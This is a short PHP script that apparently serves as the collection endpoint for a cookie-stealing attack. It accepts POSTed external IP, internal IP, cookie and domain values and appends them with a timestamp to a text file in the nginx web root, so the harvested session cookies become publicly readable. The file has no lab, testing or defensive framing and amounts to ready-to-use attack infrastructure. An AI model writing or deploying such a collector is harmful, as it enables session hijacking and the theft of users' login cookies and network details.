<?php
ini_set('date.timezone','Asia/Shanghai');
$exip = str_replace("'", '', $_POST["exip"]);
$inip = str_replace("'", '', $_POST["inip"]);
$domain = urlencode($_POST["domain"]);
$cookie = str_replace("'", '', $_POST["cookie"]);
$time = time();
$time = date('y-m-d h:i:s', $time);

if ($exip != "" && $inip != ""  && $domain != ""){
	$domain = urldecode($domain);
	$fp = fopen("/usr/share/nginx/html/out.txt", "a");
	fwrite($fp, "[$time]\nexip : $exip \ninip : $inip \ncookie: $cookie \ndomain : $domain . \n\n");
	fclose($fp);
}else{
	echo "hehe";
}
